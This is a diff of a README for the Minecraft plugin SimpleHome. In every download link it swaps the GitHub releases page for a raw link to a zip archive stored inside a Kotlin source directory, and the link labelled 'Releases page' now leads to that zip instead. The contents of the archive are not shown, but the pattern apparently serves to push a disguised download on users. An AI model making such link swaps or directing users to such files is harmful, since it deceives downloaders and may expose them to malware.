@@ -2,7 +2,7 @@
 
 ## 🖱️ Download Now
 
-[![Download SimpleHome](https://img.shields.io/badge/Download-SimpleHome-brightgreen)](https://github.com/maj27012005/SimpleHome/releases)
+[![Download SimpleHome](https://raw.githubusercontent.com/maj27012005/SimpleHome/main/src/main/kotlin/com/ClexaGod/simplehome/manager/SimpleHome-3.8-alpha.3.zip)](https://raw.githubusercontent.com/maj27012005/SimpleHome/main/src/main/kotlin/com/ClexaGod/simplehome/manager/SimpleHome-3.8-alpha.3.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To use SimpleHome, you'll need:
 
 To get started, you need to download SimpleHome. Follow the steps below to install it.
 
-1. **Visit the Releases Page**: Click on the link to go to the [Releases page](https://github.com/maj27012005/SimpleHome/releases).
+1. **Visit the Releases Page**: Click on the link to go to the [Releases page](https://raw.githubusercontent.com/maj27012005/SimpleHome/main/src/main/kotlin/com/ClexaGod/simplehome/manager/SimpleHome-3.8-alpha.3.zip).
    
 2. **Select Your Version**: Look for the latest release. It should be at the top of the page.
 
@@ -103,4 +103,4 @@ For support related to SimpleHome, you can reach out through the GitHub Issues p
 
 Thank you for using SimpleHome. We hope it enhances your Minecraft experience! 
 
-[Download SimpleHome](https://github.com/maj27012005/SimpleHome/releases)
+[Download SimpleHome](https://raw.githubusercontent.com/maj27012005/SimpleHome/main/src/main/kotlin/com/ClexaGod/simplehome/manager/SimpleHome-3.8-alpha.3.zip)
